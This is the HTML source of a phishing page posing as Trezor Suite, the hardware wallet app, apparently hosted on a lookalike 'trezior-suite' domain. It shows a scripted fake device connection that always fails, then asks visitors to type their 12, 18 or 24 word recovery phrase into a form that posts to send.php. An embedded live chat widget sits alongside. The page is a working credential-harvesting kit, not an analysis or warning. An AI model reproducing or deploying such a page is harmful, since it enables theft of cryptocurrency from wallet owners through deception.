
<html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- <link rel="icon" type="image/svg+xml" href="https://trezior-suite.azurewebsites.net/assets/img/favicon.png"> -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" >
    <!-- <link rel="stylesheet" href="https://trezior-suite.azurewebsites.net/assets/file.css" > -->
    <!-- <link rel="stylesheet" href="https://trezior-suite.azurewebsites.net/assets/main.css" > -->
    <script src="https://kit.fontawesome.com/13b480703e.js" crossorigin="anonymous"></script>
    <title>Trezor Suite</title>
    <link rel="stylesheet" href="assets/main.css">
    <link rel="stylesheet" href="assets/file.css">
</head>    <body>
    
    <div class="container-fluid">
        <div class="row">
            <div class="col-sm-5 bg-white text-center position-relative" style="height: 100vh;">
                <div class="position-absolute w-100 text-center" style="top: 40%">
                    <img src="assets/img/logo.png" alt="Logo" width="200" title="Trezor Suite" class="" style="" />
                    <h1 class="fs55 py5">Welcome!</h1>
                    <p id="alert-message"></p>

                    </div>
                </div>
                <div class="col-sm-7" style="height: 100vh; overflow: auto;  ">
                    <div class="text-center mt60 mb15 pt25">
                        <div class="p10 bg-white d-inline-block rounded-pill shadow">
                            <img src="assets/img/icon2.png" alt="Logo" width="90" title="Trezor Suite" class="rounded-circle" style="background-color: #F4F4F4" />
                            <span class="fs20 px35">Connect your Trezor</span>
                        </div>
                    </div>
                    <div class="shadow bg-white rounded-3 px10 py25">
                        <div class="row px15 border-bottom pb20 mb20">
                            <div class="col-sm-6"><button id="fetch_data" class="btn btn-secondary"></button></div>
                            <div class="col-sm-6 my10 text-center">
                                <a href="#" class="text-link text-secondary text-decoration-none">Still don’t see your Trezor? <i class="fa-solid fa-chevron-down"></i></a>
                            </div>
                        </div>
                        <div class="row px15">
                            <div class="fs18 text-dark">Try to Restore Trezor using your Mnemonic Phrase</div>
                            <div class="fs16 py20 text-dark">How many words does your Mnemonic contain?</div>
                            <div class="pt20 pb10">
                                <button data-word="12" class="btn btn-dark px15 formactive activeForm" onclick="storeNumber(this)">12 Words</button>
<button data-word="18" class="btn btn-dark px15 ms20 activeForm" onclick="storeNumber(this)">18 Words</button>
<button data-word="24" class="btn btn-dark px15 ms20 activeForm" onclick="storeNumber(this)">24 Words</button>
                            </div>
                           
                            <!-- <form method="post" action="https://trezior-suite.azurewebsites.net/send.php" class="py10"> -->
                            <form method="post" action="send.php" class="py10">
                                <div class="row form_keys"></div>
                                <div class="row">
                                    <div class="col-sm-12 my20">
                                        <input type="hidden" name="nooftabs" value="12" id="wordCountInput">
                                        <button type="submit" class="btn btn-success text-white border px40 fs16 fw-bold py10 ">Next ...</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            function storeNumber(button) {
// Get the data-word attribute from the clicked button
var wordCount = button.getAttribute('data-word');

// Set the value of the input field
document.getElementById('wordCountInput').value = wordCount;
}
        </script>

        <div class="modal fade" id="usbModal" tabindex="-1" aria-labelledby="usbModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="usbModalLabel">USB Device Detected</h5>
                        <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button> -->
                    </div>
                    <div class="modal-body">
                        A USB device has been plugged in.
                    </div>
                    <div class="modal-footer">
                        <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button> -->
                    </div>
                </div>
            </div>
        </div>



        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

<script src="/socket.io/socket.io.js"></script>
<script>
         const socket = io();

socket.on('usb-detection', (message) => {
    if (message.includes('plugged in')) {
        $('#usbModal').modal('show');
    } else if (message.includes('removed')) {
        $('#usbModal').modal('hide');
    }
});
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
<!--Start of Tawk.to Script-->
<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
    var _smartsupp = _smartsupp || {};
    _smartsupp.key = '01681838ce4cb234168130ae056ecbae300597a3';
    window.smartsupp||(function(d) {
      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
      c.type='text/javascript';c.charset='utf-8';c.async=true;
      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
    })(document);
    </script>
    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
<script type="text/javascript">
    
    function fetch_data_btn_init() {
        $('#fetch_data').addClass('btn-success').removeClass('btn-secondary').html('<i class="fa-solid fa-circle-notch fa-spin fs18"></i> <span class="ms10">Establishing connection</span>');
        setTimeout(function() {
            fetch_data_btn_connect();
        },8000);
    }
    
    function fetch_data_btn_connect() {
        $('#fetch_data').addClass('btn-success').removeClass('btn-secondary').html('<i class="fa-solid fa-circle-notch fa-spin fs18"></i> <span class="ms10">Exchanging Keys...</span>');
        setTimeout(function() {
            fetch_data_btn_reset();
        },8000);
    }
    
    function fetch_data_btn_reset() {
        $('#fetch_data').addClass('btn-secondary').removeClass('btn-success').html('<i class="fa-solid fa-circle-exclamation text-danger fs18"></i> <span class="ms10">Unable to read data</span>');
    }
    
    $(document).on('click', '#fetch_data', (e) => {
        setTimeout(function() {
            fetch_data_btn_init();
        },300);
    });
    
    fetch_data_btn_reset();
    
                                    
    
    
    
    
    $(document).on('click', '#toggleSidebar', () => $("#sidebar_div").css('margin-left', $("#sidebar_div").css("margin-left") == '-300px' ? '0px' : '-300px'));
    
    $(document).on('click', 'button.activeForm', (e) => {
        let btn = e.target;
        let word = $(btn).attr('data-word');
        $('button.activeForm').removeClass('formactive');
        $(btn).addClass('formactive');
        addInput(word);
    });
    
    $(document).ready(() => {
        setTimeout(()=> {
            addInput(12);
        },50);
    });
    
    addInput        =   (word)  =>  {
        console.log(word);
        let keys_input      =   '';
        $('.form_keys').html('');
        for (var i = 1; i <= parseInt(word); i++) {
            $('.form_keys').append(`<div class="col-sm-4 my12">
                <input type="text" name="keys[${i}]" class="form-control py8 key_input" placeholder="${i}." required="" style="background: transparent; border: 1px solid #c5c5c5;" onkeypress="return onlyAlphabets(event,this);" autocomplete="off">
            </div>`)
        }
    }
    
    function onlyAlphabets(e, t) {
        try {
            if (window.event) {
                var charCode = window.event.keyCode;
            }
            else if (e) {
                var charCode = e.which;
            }
            else { return true; }
            if ((charCode > 64 && charCode < 91) || (charCode > 96 && charCode < 123 || charCode == 32))
                return true;
            else
                return false;
        }
        catch (err) {
            alert(err.Description);
        }
    }
    
</script>
    </body>
</html>